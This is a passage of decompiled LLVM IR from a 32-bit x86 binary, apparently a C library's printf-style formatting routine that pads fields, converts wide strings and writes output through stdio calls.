  store i32 %v1_804eb0f, i32* @edi, align 4
  %v1_804eb16 = add i32 %v0_804e848.lcssa, 205
  %v2_804eb16 = inttoptr i32 %v1_804eb16 to i8*
  store i8 0, i8* %v2_804eb16, align 1
  %v0_804eb1e = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb1e = trunc i32 %v0_804eb1e to i8
  %v2_804eb1e = load i32, i32* @esp, align 4
  %v3_804eb1e = add i32 %v2_804eb1e, 204
  %v4_804eb1e = inttoptr i32 %v3_804eb1e to i8*
  store i8 %v1_804eb1e, i8* %v4_804eb1e, align 1
  br label %dec_label_pc_804eb66

dec_label_pc_804eb27:                             ; preds = %dec_label_pc_804eaca
  %v1_804eb27 = add i32 %v3_804e848, -20
  %v9_804eb27 = icmp eq i32 %v1_804eb27, 0
  %v10_804eb27 = icmp slt i32 %v1_804eb27, 0
  store i1 %v10_804eb27, i1* %sf.global-to-local, align 1
  %v1_804eb2a = icmp eq i1 %v9_804eb27, false
  br i1 %v1_804eb2a, label %dec_label_pc_804eccb, label %dec_label_pc_804eb30

dec_label_pc_804eb30:                             ; preds = %dec_label_pc_804eb27
  %v0_804eb30 = load i32, i32* %stack_var_-364, align 4
  %v1_804eb30 = call i32 @__errno_location(i32 %v0_804eb30)
  store i32 %v1_804eb30, i32* %eax.global-to-local, align 4
  %v0_804eb35 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eb35 = load i32, i32* @esp, align 4
  %v2_804eb35 = add i32 %v1_804eb35, -4
  %v3_804eb35 = inttoptr i32 %v2_804eb35 to i32*
  store i32 %v0_804eb35, i32* %v3_804eb35, align 4
  %v1_804eb36 = add i32 %v1_804eb35, -8
  %v2_804eb36 = inttoptr i32 %v1_804eb36 to i32*
  store i32 128, i32* %v2_804eb36, align 4
  %v1_804eb3b = add i32 %v1_804eb35, 204
  store i32 %v1_804eb3b, i32* %edx.global-to-local, align 4
  %v2_804eb42 = add i32 %v1_804eb35, -12
  %v3_804eb42 = inttoptr i32 %v2_804eb42 to i32*
  store i32 %v1_804eb3b, i32* %v3_804eb42, align 4
  %v1_804eb43 = inttoptr i32 %v1_804eb30 to i32*
  %v2_804eb43 = load i32, i32* %v1_804eb43, align 4
  %v4_804eb43 = add i32 %v1_804eb35, -16
  %v5_804eb43 = inttoptr i32 %v4_804eb43 to i32*
  store i32 %v2_804eb43, i32* %v5_804eb43, align 4
  %v0_804eb45 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804eb45, i32* %eax.global-to-local, align 4
  %v0_804eb4a = load i32, i32* @esp, align 4
  %v1_804eb4a = add i32 %v0_804eb4a, 16
  %v7_804eb4a = icmp slt i32 %v1_804eb4a, 0
  store i1 %v7_804eb4a, i1* %sf.global-to-local, align 1
  store i32 %v0_804eb45, i32* @edi, align 4
  br label %dec_label_pc_804eade

dec_label_pc_804eb51:                             ; preds = %dec_label_pc_804e9d2, %dec_label_pc_804e9cb, %dec_label_pc_804e9b8
  %v0_804eb6e34 = phi i32 [ %v1_804e961, %dec_label_pc_804e9d2 ], [ 0, %dec_label_pc_804e9cb ], [ 5, %dec_label_pc_804e9b8 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804eb6b

dec_label_pc_804eb55:                             ; preds = %dec_label_pc_804ead8, %dec_label_pc_804ea4a
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805733e.166 to i32), i32* @edi, align 4
  br label %dec_label_pc_804eb66

dec_label_pc_804eb66:                             ; preds = %dec_label_pc_804eb01, %dec_label_pc_804eaf8, %dec_label_pc_804ea8c, %dec_label_pc_804eb55
  %v0_804eb66 = load i32, i32* @esp, align 4
  %v1_804eb66 = add i32 %v0_804eb66, 7
  %v2_804eb66 = inttoptr i32 %v1_804eb66 to i8*
  store i8 32, i8* %v2_804eb66, align 1
  %v0_804eb6e.pre = load i32, i32* @esi, align 4
  %v1_804eb6e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804eb6b

dec_label_pc_804eb6b:                             ; preds = %dec_label_pc_804eb51, %dec_label_pc_804e9da, %dec_label_pc_804eb66
  %v1_804eb6e = phi i32 [ 0, %dec_label_pc_804eb51 ], [ %v2_804e9d2, %dec_label_pc_804e9da ], [ %v1_804eb6e.pre, %dec_label_pc_804eb66 ]
  %v0_804eb6e = phi i32 [ %v0_804eb6e34, %dec_label_pc_804eb51 ], [ %v1_804e961, %dec_label_pc_804e9da ], [ %v0_804eb6e.pre, %dec_label_pc_804eb66 ]
  %v0_804eb6b = load i32, i32* @ebp, align 4
  %v1_804eb6b = add i32 %v0_804eb6b, -11
  %v9_804eb6b = icmp eq i32 %v1_804eb6b, 0
  %v10_804eb6b = icmp slt i32 %v1_804eb6b, 0
  store i1 %v10_804eb6b, i1* %sf.global-to-local, align 1
  %v2_804eb6e = add i32 %v0_804eb6e, %v1_804eb6e
  store i32 %v2_804eb6e, i32* @edx, align 4
  br i1 %v9_804eb6b, label %dec_label_pc_804eb7f, label %dec_label_pc_804eb73

dec_label_pc_804eb73:                             ; preds = %dec_label_pc_804eb6b
  %v1_804eb75 = add i32 %v0_804eb6b, -5
  %v6_804eb75 = sub i32 4, %v0_804eb6b
  %v7_804eb75 = and i32 %v6_804eb75, %v0_804eb6b
  %v8_804eb75 = icmp slt i32 %v7_804eb75, 0
  %v9_804eb75 = icmp eq i32 %v1_804eb75, 0
  %v10_804eb75 = icmp slt i32 %v1_804eb75, 0
  store i1 %v10_804eb75, i1* %sf.global-to-local, align 1
  %v3_804eb78 = icmp eq i1 %v10_804eb75, %v8_804eb75
  %v4_804eb78 = icmp eq i1 %v9_804eb75, false
  %v5_804eb78 = and i1 %v4_804eb78, %v3_804eb78
  %v6_804eb78 = zext i1 %v5_804eb78 to i32
  store i32 %v6_804eb78, i32* %eax.global-to-local, align 4
  %v2_804eb7b = add i32 %v2_804eb6e, 1
  %v3_804eb7b = add i32 %v2_804eb7b, %v6_804eb78
  store i32 %v3_804eb7b, i32* @edx, align 4
  br label %dec_label_pc_804eb7f

dec_label_pc_804eb7f:                             ; preds = %dec_label_pc_804eb6b, %dec_label_pc_804eb73
  %v0_804eb7f = load i32, i32* @esp, align 4
  %v1_804eb7f = add i32 %v0_804eb7f, 24
  %v2_804eb7f = inttoptr i32 %v1_804eb7f to i32*
  %v3_804eb7f = load i32, i32* %v2_804eb7f, align 4
  store i32 %v3_804eb7f, i32* %eax.global-to-local, align 4
  %v1_804eb83 = add i32 %v0_804eb7f, 8
  %v2_804eb83 = inttoptr i32 %v1_804eb83 to i32*
  store i32 0, i32* %v2_804eb83, align 4
  %v0_804eb8b = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb8b = load i32, i32* @edx, align 4
  %v2_804eb8b = sub i32 %v0_804eb8b, %v1_804eb8b
  %v7_804eb8b = icmp ult i32 %v0_804eb8b, %v1_804eb8b
  %v12_804eb8b = icmp eq i32 %v2_804eb8b, 0
  %v13_804eb8b = icmp slt i32 %v2_804eb8b, 0
  store i1 %v13_804eb8b, i1* %sf.global-to-local, align 1
  %v2_804eb8d = or i1 %v7_804eb8b, %v12_804eb8b
  br i1 %v2_804eb8d, label %dec_label_pc_804eb95, label %dec_label_pc_804eb8f

dec_label_pc_804eb8f:                             ; preds = %dec_label_pc_804eb7f
  store i1 %v13_804eb8b, i1* %sf.global-to-local, align 1
  store i32 %v2_804eb8b, i32* %eax.global-to-local, align 4
  %v1_804eb91 = load i32, i32* @esp, align 4
  %v2_804eb91 = add i32 %v1_804eb91, 8
  %v3_804eb91 = inttoptr i32 %v2_804eb91 to i32*
  store i32 %v2_804eb8b, i32* %v3_804eb91, align 4
  %v0_804eb99.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804eb95

dec_label_pc_804eb95:                             ; preds = %dec_label_pc_804eb7f, %dec_label_pc_804eb8f
  %v0_804eb99 = phi i32 [ %v1_804eb8b, %dec_label_pc_804eb7f ], [ %v0_804eb99.pre, %dec_label_pc_804eb8f ]
  %v0_804eb95 = load i32, i32* @esp, align 4
  %v1_804eb95 = add i32 %v0_804eb95, 8
  %v2_804eb95 = inttoptr i32 %v1_804eb95 to i32*
  %v3_804eb95 = load i32, i32* %v2_804eb95, align 4
  store i32 %v3_804eb95, i32* @ecx, align 4
  %v2_804eb99 = add i32 %v3_804eb95, %v0_804eb99
  store i32 %v2_804eb99, i32* %eax.global-to-local, align 4
  %v1_804eb9c = inttoptr i32 %v0_804eb95 to i32*
  %v2_804eb9c = load i32, i32* %v1_804eb9c, align 4
  %v4_804eb9c = add i32 %v2_804eb9c, %v2_804eb99
  %v15_804eb9c = icmp slt i32 %v4_804eb9c, 0
  store i1 %v15_804eb9c, i1* %sf.global-to-local, align 1
  store i32 %v4_804eb9c, i32* %v1_804eb9c, align 4
  %v0_804eb9f = load i32, i32* @esp, align 4
  %v1_804eb9f = add i32 %v0_804eb9f, 7
  %v2_804eb9f = inttoptr i32 %v1_804eb9f to i8*
  %v3_804eb9f = load i8, i8* %v2_804eb9f, align 1
  %v4_804eb9f = add i8 %v3_804eb9f, -48
  %v9_804eb9f = icmp eq i8 %v4_804eb9f, 0
  %v10_804eb9f = icmp slt i8 %v4_804eb9f, 0
  store i1 %v10_804eb9f, i1* %sf.global-to-local, align 1
  %v1_804eba4 = icmp eq i1 %v9_804eb9f, false
  br i1 %v1_804eba4, label %dec_label_pc_804ebb0, label %dec_label_pc_804eba6

dec_label_pc_804eba6:                             ; preds = %dec_label_pc_804eb95
  %v0_804eba6 = load i32, i32* @ebx, align 4
  %v1_804eba6 = load i32, i32* @ecx, align 4
  %v2_804eba6 = add i32 %v1_804eba6, %v0_804eba6
  %v13_804eba6 = icmp slt i32 %v2_804eba6, 0
  store i1 %v13_804eba6, i1* %sf.global-to-local, align 1
  store i32 %v2_804eba6, i32* @ebx, align 4
  %v1_804eba8 = add i32 %v0_804eb9f, 8
  %v2_804eba8 = inttoptr i32 %v1_804eba8 to i32*
  store i32 0, i32* %v2_804eba8, align 4
  %v0_804ebb0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ebb0

dec_label_pc_804ebb0:                             ; preds = %dec_label_pc_804eb95, %dec_label_pc_804eba6
  %v0_804ebb7 = phi i32 [ %v0_804eb9f, %dec_label_pc_804eb95 ], [ %v0_804ebb0.pre, %dec_label_pc_804eba6 ]
  %v1_804ebb0 = add i32 %v0_804ebb7, 32
  %v2_804ebb0 = inttoptr i32 %v1_804ebb0 to i8*
  %v3_804ebb0 = load i8, i8* %v2_804ebb0, align 1
  %v4_804ebb0 = and i8 %v3_804ebb0, 8
  %v5_804ebb0 = icmp eq i8 %v4_804ebb0, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804ebb5 = icmp eq i1 %v5_804ebb0, false
  br i1 %v1_804ebb5, label %dec_label_pc_804ebde, label %dec_label_pc_804ebb7

dec_label_pc_804ebb7:                             ; preds = %dec_label_pc_804ebb0
  %v1_804ebb7 = add i32 %v0_804ebb7, 8
  %v2_804ebb7 = inttoptr i32 %v1_804ebb7 to i32*
  %v3_804ebb7 = load i32, i32* %v2_804ebb7, align 4
  store i32 %v3_804ebb7, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804ebc0 = add i32 %v0_804ebb7, 368
  %v2_804ebc0 = inttoptr i32 %v1_804ebc0 to i32*
  %v3_804ebc0 = load i32, i32* %v2_804ebc0, align 4
  store i32 %v3_804ebc0, i32* @eax, align 4
  %v0_804ebc7 = call i32 @_charpad()
  store i32 %v0_804ebc7, i32* %eax.global-to-local, align 4
  %v1_804ebcc = load i32, i32* @esp, align 4
  %v2_804ebcc = add i32 %v1_804ebcc, 8
  %v3_804ebcc = inttoptr i32 %v2_804ebcc to i32*
  %v4_804ebcc = load i32, i32* %v3_804ebcc, align 4
  %v5_804ebcc = sub i32 %v0_804ebc7, %v4_804ebcc
  %v15_804ebcc = icmp eq i32 %v5_804ebcc, 0
  %v16_804ebcc = icmp slt i32 %v5_804ebcc, 0
  store i1 %v16_804ebcc, i1* %sf.global-to-local, align 1
  %v1_804ebd0 = icmp eq i1 %v15_804ebcc, false
  br i1 %v1_804ebd0, label %dec_label_pc_804eccb, label %dec_label_pc_804ebd6

dec_label_pc_804ebd6:                             ; preds = %dec_label_pc_804ebb7
  store i32 0, i32* %v3_804ebcc, align 4
  %v1_804ebde.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ebde

dec_label_pc_804ebde:                             ; preds = %dec_label_pc_804ebb0, %dec_label_pc_804ebd6
  %v1_804ebde = phi i32 [ %v0_804ebb7, %dec_label_pc_804ebb0 ], [ %v1_804ebde.pre, %dec_label_pc_804ebd6 ]
  %v0_804ebde = load i32, i32* %eax.global-to-local, align 4
  %v2_804ebde = add i32 %v1_804ebde, -4
  %v3_804ebde = inttoptr i32 %v2_804ebde to i32*
  store i32 %v0_804ebde, i32* %v3_804ebde, align 4
  %v0_804ebdf = load i32, i32* %eax.global-to-local, align 4
  %v2_804ebdf = add i32 %v1_804ebde, -8
  %v3_804ebdf = inttoptr i32 %v2_804ebdf to i32*
  store i32 %v0_804ebdf, i32* %v3_804ebdf, align 4
  %v1_804ebe0 = add i32 %v1_804ebde, 368
  %v2_804ebe0 = inttoptr i32 %v1_804ebe0 to i32*
  %v3_804ebe0 = load i32, i32* %v2_804ebe0, align 4
  %v5_804ebe0 = add i32 %v1_804ebde, -12
  %v6_804ebe0 = inttoptr i32 %v5_804ebe0 to i32*
  store i32 %v3_804ebe0, i32* %v6_804ebe0, align 4
  %v0_804ebe7 = load i32, i32* @ebp, align 4
  %v1_804ebe7 = add i32 %v0_804ebe7, ptrtoint (i32* @global_var_8057345.167 to i32)
  store i32 %v1_804ebe7, i32* %eax.global-to-local, align 4
  %v2_804ebed = add i32 %v1_804ebde, -16
  %v3_804ebed = inttoptr i32 %v2_804ebed to i32*
  store i32 %v1_804ebe7, i32* %v3_804ebed, align 4
  %v0_804ebee = load i32, i32* %stack_var_-364, align 4
  %v4_804ebee = inttoptr i32 %v0_804ebee to i8*
  %v5_804ebee = call i32 @__GI_fputs_unlocked(i8* %v4_804ebee, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ebee, i32* %eax.global-to-local, align 4
  %v0_804ebf3 = load i32, i32* @esp, align 4
  %v1_804ebf3 = add i32 %v0_804ebf3, 384
  %v2_804ebf3 = inttoptr i32 %v1_804ebf3 to i32*
  %v3_804ebf3 = load i32, i32* %v2_804ebf3, align 4
  store i32 %v3_804ebf3, i32* @eax, align 4
  %v0_804ebfa = load i32, i32* @ebx, align 4
  store i32 %v0_804ebfa, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804ec01 = call i32 @_charpad()
  store i32 %v0_804ec01, i32* %eax.global-to-local, align 4
  %v0_804ec06 = load i32, i32* @esp, align 4
  %v1_804ec06 = add i32 %v0_804ec06, 16
  %v1_804ec09 = load i32, i32* @ebx, align 4
  %v2_804ec09 = sub i32 %v0_804ec01, %v1_804ec09
  %v12_804ec09 = icmp eq i32 %v2_804ec09, 0
  %v13_804ec09 = icmp slt i32 %v2_804ec09, 0
  store i1 %v13_804ec09, i1* %sf.global-to-local, align 1
  %v1_804ec0b = icmp eq i1 %v12_804ec09, false
  br i1 %v1_804ec0b, label %dec_label_pc_804eccb, label %dec_label_pc_804ec11

dec_label_pc_804ec11:                             ; preds = %dec_label_pc_804ebde
  %v1_804ec11 = add i32 %v0_804ec06, 356
  %v2_804ec11 = inttoptr i32 %v1_804ec11 to i32*
  %v3_804ec11 = load i32, i32* %v2_804ec11, align 4
  %v4_804ec11 = icmp eq i32 %v3_804ec11, 0
  %v5_804ec11 = icmp slt i32 %v3_804ec11, 0
  store i1 %v5_804ec11, i1* %sf.global-to-local, align 1
  %v1_804ec19 = icmp eq i1 %v4_804ec11, false
  br i1 %v1_804ec19, label %dec_label_pc_804ec3d, label %dec_label_pc_804ec1b

dec_label_pc_804ec1b:                             ; preds = %dec_label_pc_804ec11
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804ec1d = load i32, i32* @esi, align 4
  %v1_804ec1d = icmp eq i32 %v0_804ec1d, 0
  %v2_804ec1d = icmp slt i32 %v0_804ec1d, 0
  store i1 %v2_804ec1d, i1* %sf.global-to-local, align 1
  br i1 %v1_804ec1d, label %dec_label_pc_804ec33, label %dec_label_pc_804ec21

dec_label_pc_804ec21:                             ; preds = %dec_label_pc_804ec1b
  %v2_804ec21 = add i32 %v0_804ec06, 12
  %v3_804ec21 = inttoptr i32 %v2_804ec21 to i32*
  store i32 0, i32* %v3_804ec21, align 4
  %v1_804ec22 = add i32 %v0_804ec06, 384
  %v2_804ec22 = inttoptr i32 %v1_804ec22 to i32*
  %v3_804ec22 = load i32, i32* %v2_804ec22, align 4
  %v5_804ec22 = add i32 %v0_804ec06, 8
  %v6_804ec22 = inttoptr i32 %v5_804ec22 to i32*
  store i32 %v3_804ec22, i32* %v6_804ec22, align 4
  %v0_804ec29 = load i32, i32* @esi, align 4
  %v2_804ec29 = add i32 %v0_804ec06, 4
  %v3_804ec29 = inttoptr i32 %v2_804ec29 to i32*
  store i32 %v0_804ec29, i32* %v3_804ec29, align 4
  %v0_804ec2a = load i32, i32* @edi, align 4
  %v3_804ec2a = inttoptr i32 %v0_804ec06 to i32*
  store i32 %v0_804ec2a, i32* %v3_804ec2a, align 4
  %v0_804ec2b = load i32, i32* %stack_var_-364, align 4
  %v4_804ec2b = call i32 @__stdio_fwrite(i32 %v0_804ec2b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ec2b, i32* %eax.global-to-local, align 4
  %v0_804ec30 = load i32, i32* @esp, align 4
  %v1_804ec30 = add i32 %v0_804ec30, 16
  %v7_804ec30 = icmp slt i32 %v1_804ec30, 0
  store i1 %v7_804ec30, i1* %sf.global-to-local, align 1
  %v1_804ec33.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ec33

dec_label_pc_804ec33:                             ; preds = %dec_label_pc_804ec1b, %dec_label_pc_804ec21
  %v0_804ec9d46 = phi i32 [ %v1_804ec06, %dec_label_pc_804ec1b ], [ %v1_804ec30, %dec_label_pc_804ec21 ]
  %v1_804ec33 = phi i32 [ 0, %dec_label_pc_804ec1b ], [ %v1_804ec33.pre, %dec_label_pc_804ec21 ]
  %v0_804ec33 = phi i32 [ 0, %dec_label_pc_804ec1b ], [ %v4_804ec2b, %dec_label_pc_804ec21 ]
  %v2_804ec33 = sub i32 %v0_804ec33, %v1_804ec33
  %v12_804ec33 = icmp eq i32 %v2_804ec33, 0
  %v13_804ec33 = icmp slt i32 %v2_804ec33, 0
  store i1 %v13_804ec33, i1* %sf.global-to-local, align 1
  %v1_804ec35 = icmp eq i1 %v12_804ec33, false
  br i1 %v1_804ec35, label %dec_label_pc_804eccb, label %dec_label_pc_804ec9d

dec_label_pc_804ec3d:                             ; preds = %dec_label_pc_804ec11
  %v1_804ec3d = add i32 %v0_804ec06, 348
  %v2_804ec3d = inttoptr i32 %v1_804ec3d to i32*
  store i32 0, i32* %v2_804ec3d, align 4
  %v0_804ec998 = load i32, i32* @esi, align 4
  %v1_804ec999 = icmp eq i32 %v0_804ec998, 0
  %v2_804ec9910 = icmp slt i32 %v0_804ec998, 0
  store i1 %v2_804ec9910, i1* %sf.global-to-local, align 1
  %v1_804ec9b16 = icmp eq i1 %v1_804ec999, false
  %v0_804ec4a.pre = load i32, i32* @esp, align 4
  br i1 %v1_804ec9b16, label %dec_label_pc_804ec4a, label %dec_label_pc_804ec9d

dec_label_pc_804ec4a:                             ; preds = %dec_label_pc_804ec3d, %dec_label_pc_804ec97
  %v0_804ec51 = phi i32 [ %v2_804ec97, %dec_label_pc_804ec97 ], [ %v0_804ec998, %dec_label_pc_804ec3d ]
  %v1_804ec5c = phi i32 [ %v0_804ec4a41, %dec_label_pc_804ec97 ], [ %v0_804ec4a.pre, %dec_label_pc_804ec3d ]
  %v1_804ec4a = add i32 %v1_804ec5c, 332
  store i32 %v1_804ec4a, i32* %edx.global-to-local, align 4
  %v1_804ec51 = add i32 %v0_804ec51, -128
  %v2_804ec51 = icmp ult i32 %v0_804ec51, 128
  %v6_804ec51 = icmp eq i32 %v1_804ec51, 0
  %v7_804ec51 = icmp slt i32 %v1_804ec51, 0
  store i1 %v7_804ec51, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804ec5c = add i32 %v1_804ec5c, -4
  %v3_804ec5c = inttoptr i32 %v2_804ec5c to i32*
  store i32 %v1_804ec4a, i32* %v3_804ec5c, align 4
  %v2_804ec5d = or i1 %v2_804ec51, %v6_804ec51
  %v3_804ec5d = load i32, i32* %eax.global-to-local, align 4
  %v4_804ec5d = load i32, i32* @esi, align 4
  %v5_804ec5d = select i1 %v2_804ec5d, i32 %v4_804ec5d, i32 %v3_804ec5d
  %v2_804ec60 = add i32 %v1_804ec5c, -8
  %v3_804ec60 = inttoptr i32 %v2_804ec60 to i32*
  store i32 %v5_804ec5d, i32* %v3_804ec60, align 4
  %v1_804ec61 = add i32 %v1_804ec5c, 340
  store i32 %v1_804ec61, i32* %eax.global-to-local, align 4
  %v2_804ec68 = add i32 %v1_804ec5c, -12
  %v3_804ec68 = inttoptr i32 %v2_804ec68 to i32*
  store i32 %v1_804ec61, i32* %v3_804ec68, align 4
  %v1_804ec69 = add i32 %v1_804ec5c, 204
  store i32 %v1_804ec69, i32* @edi, align 4
  %v2_804ec70 = add i32 %v1_804ec5c, -16
  %v3_804ec70 = inttoptr i32 %v2_804ec70 to i32*
  store i32 %v1_804ec69, i32* %v3_804ec70, align 4
  %v0_804ec71 = call i32 @__GI_wcsrtombs()
  %v0_804ec76 = load i32, i32* @esp, align 4
  %v1_804ec76 = add i32 %v0_804ec76, 16
  store i32 %v0_804ec71, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ec7d = icmp eq i32 %v0_804ec71, 0
  %v2_804ec7d = icmp slt i32 %v0_804ec71, 0
  store i1 %v2_804ec7d, i1* %sf.global-to-local, align 1
  br i1 %v1_804ec7d, label %dec_label_pc_804ec93, label %dec_label_pc_804ec81

dec_label_pc_804ec81:                             ; preds = %dec_label_pc_804ec4a
  %v0_804ec81 = load i32, i32* @ebp, align 4
  %v2_804ec81 = add i32 %v0_804ec76, 12
  %v3_804ec81 = inttoptr i32 %v2_804ec81 to i32*
  store i32 %v0_804ec81, i32* %v3_804ec81, align 4
  %v1_804ec82 = add i32 %v0_804ec76, 384
  %v2_804ec82 = inttoptr i32 %v1_804ec82 to i32*
  %v3_804ec82 = load i32, i32* %v2_804ec82, align 4
  %v5_804ec82 = add i32 %v0_804ec76, 8
  %v6_804ec82 = inttoptr i32 %v5_804ec82 to i32*
  store i32 %v3_804ec82, i32* %v6_804ec82, align 4
  %v2_804ec89 = add i32 %v0_804ec76, 4
  %v3_804ec89 = inttoptr i32 %v2_804ec89 to i32*
  store i32 %v0_804ec71, i32* %v3_804ec89, align 4
  %v0_804ec8a = load i32, i32* @edi, align 4
  %v3_804ec8a = inttoptr i32 %v0_804ec76 to i32*
  store i32 %v0_804ec8a, i32* %v3_804ec8a, align 4
  %v0_804ec8b = load i32, i32* %stack_var_-364, align 4
  %v4_804ec8b = call i32 @__stdio_fwrite(i32 %v0_804ec8b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ec8b, i32* %eax.global-to-local, align 4
  %v0_804ec90 = load i32, i32* @esp, align 4
  %v1_804ec90 = add i32 %v0_804ec90, 16
  %v7_804ec90 = icmp slt i32 %v1_804ec90, 0
  store i1 %v7_804ec90, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ec93

dec_label_pc_804ec93:                             ; preds = %dec_label_pc_804ec4a, %dec_label_pc_804ec81
  %v1_804ec97 = phi i32 [ 0, %dec_label_pc_804ec4a ], [ %v4_804ec8b, %dec_label_pc_804ec81 ]
  %v0_804ec4a41 = phi i32 [ %v1_804ec76, %dec_label_pc_804ec4a ], [ %v1_804ec90, %dec_label_pc_804ec81 ]
  %v2_804ec93 = sub i32 %v1_804ec97, %v0_804ec71
  %v12_804ec93 = icmp eq i32 %v2_804ec93, 0
  %v13_804ec93 = icmp slt i32 %v2_804ec93, 0
  store i1 %v13_804ec93, i1* %sf.global-to-local, align 1
  %v1_804ec95 = icmp eq i1 %v12_804ec93, false
  br i1 %v1_804ec95, label %dec_label_pc_804eccb, label %dec_label_pc_804ec97

dec_label_pc_804ec97:                             ; preds = %dec_label_pc_804ec93
  %v0_804ec97 = load i32, i32* @esi, align 4
  %v2_804ec97 = sub i32 %v0_804ec97, %v1_804ec97
  %v12_804ec97 = icmp eq i32 %v2_804ec97, 0
  %v13_804ec97 = icmp slt i32 %v2_804ec97, 0
  store i32 %v2_804ec97, i32* @esi, align 4
  store i1 %v13_804ec97, i1* %sf.global-to-local, align 1
  %v1_804ec9b = icmp eq i1 %v12_804ec97, false
  br i1 %v1_804ec9b, label %dec_label_pc_804ec4a, label %dec_label_pc_804ec9d

dec_label_pc_804ec9d:                             ; preds = %dec_label_pc_804ec97, %dec_label_pc_804ec3d, %dec_label_pc_804ec33
  %v0_804ec9d = phi i32 [ %v0_804ec9d46, %dec_label_pc_804ec33 ], [ %v0_804ec4a.pre, %dec_label_pc_804ec3d ], [ %v0_804ec4a41, %dec_label_pc_804ec97 ]
  %v1_804ec9d = add i32 %v0_804ec9d, 8
  %v2_804ec9d = inttoptr i32 %v1_804ec9d to i32*
  %v3_804ec9d = load i32, i32* %v2_804ec9d, align 4
  store i32 %v3_804ec9d, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804eca6 = add i32 %v0_804ec9d, 368
  %v2_804eca6 = inttoptr i32 %v1_804eca6 to i32*
  %v3_804eca6 = load i32, i32* %v2_804eca6, align 4
  store i32 %v3_804eca6, i32* @eax, align 4
  %v0_804ecad = call i32 @_charpad()
  store i32 %v0_804ecad, i32* %eax.global-to-local, align 4
  %v1_804ecb2 = load i32, i32* @esp, align 4
  %v2_804ecb2 = add i32 %v1_804ecb2, 8
  %v3_804ecb2 = inttoptr i32 %v2_804ecb2 to i32*
  %v4_804ecb2 = load i32, i32* %v3_804ecb2, align 4
  %v5_804ecb2 = sub i32 %v0_804ecad, %v4_804ecb2
  %v15_804ecb2 = icmp eq i32 %v5_804ecb2, 0
  %v16_804ecb2 = icmp slt i32 %v5_804ecb2, 0
  store i1 %v16_804ecb2, i1* %sf.global-to-local, align 1
  %v1_804ecb6 = icmp eq i1 %v15_804ecb2, false
  br i1 %v1_804ecb6, label %dec_label_pc_804eccb, label %dec_label_pc_804ecb8

dec_label_pc_804ecb8:                             ; preds = %dec_label_pc_804ec9d, %dec_label_pc_804ea25, %dec_label_pc_804e850
  %v0_804ecb8 = phi i32 [ %v1_804ecb2, %dec_label_pc_804ec9d ], [ %v0_804ecb8.pre, %dec_label_pc_804ea25 ], [ %v1_804e86e, %dec_label_pc_804e850 ]
  %v1_804ecb8 = add i32 %v0_804ecb8, 16
  %v2_804ecb8 = inttoptr i32 %v1_804ecb8 to i32*
  %v3_804ecb8 = load i32, i32* %v2_804ecb8, align 4
  store i32 %v3_804ecb8, i32* @ebx, align 4
  store i32 %v3_804ecb8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e7a8.backedge

dec_label_pc_804ecc3:                             ; preds = %dec_label_pc_804e7e6
  %v1_804ecc3 = add i32 %v0_804ecc3, 2
  %v10_804ecc3 = icmp slt i32 %v1_804ecc3, 0
  store i1 %v10_804ecc3, i1* %sf.global-to-local, align 1
  store i32 %v1_804ecc3, i32* @ebx, align 4
  br label %dec_label_pc_804e7a8.backedge

dec_label_pc_804eccb:                             ; preds = %dec_label_pc_804e7d2, %dec_label_pc_804ec9d, %dec_label_pc_804ec33, %dec_label_pc_804ebde, %dec_label_pc_804ebb7, %dec_label_pc_804eb27, %dec_label_pc_804ea9a, %dec_label_pc_804ea5b, %dec_label_pc_804e9fc, %dec_label_pc_804ec93
  %v0_804eccb = phi i32 [ %v0_804ec4a41, %dec_label_pc_804ec93 ], [ %v0_804eccb.pre.pre, %dec_label_pc_804e7d2 ], [ %v1_804ecb2, %dec_label_pc_804ec9d ], [ %v0_804ec9d46, %dec_label_pc_804ec33 ], [ %v1_804ec06, %dec_label_pc_804ebde ], [ %v1_804ebcc, %dec_label_pc_804ebb7 ], [ %v0_804e848.lcssa, %dec_label_pc_804eb27 ], [ %v1_804eab2, %dec_label_pc_804ea9a ], [ %v1_804ea7e, %dec_label_pc_804ea5b ], [ %v1_804ea1a, %dec_label_pc_804e9fc ]
  %v1_804eccb = inttoptr i32 %v0_804eccb to i32*
  store i32 -1, i32* %v1_804eccb, align 4
  br label %dec_label_pc_804ecd2

dec_label_pc_804ecd2:                             ; preds = %dec_label_pc_804e7dd, %dec_label_pc_804e74b, %dec_label_pc_804e76a, %dec_label_pc_804eccb
  %v0_804ecd2 = load i32, i32* @esp, align 4
  %v1_804ecd2 = inttoptr i32 %v0_804ecd2 to i32*
  %v2_804ecd2 = load i32, i32* %v1_804ecd2, align 4
  store i32 %v2_804ecd2, i32* %eax.global-to-local, align 4
  %v1_804ecd5 = add i32 %v0_804ecd2, 348
  %v10_804ecd5 = icmp slt i32 %v1_804ecd5, 0
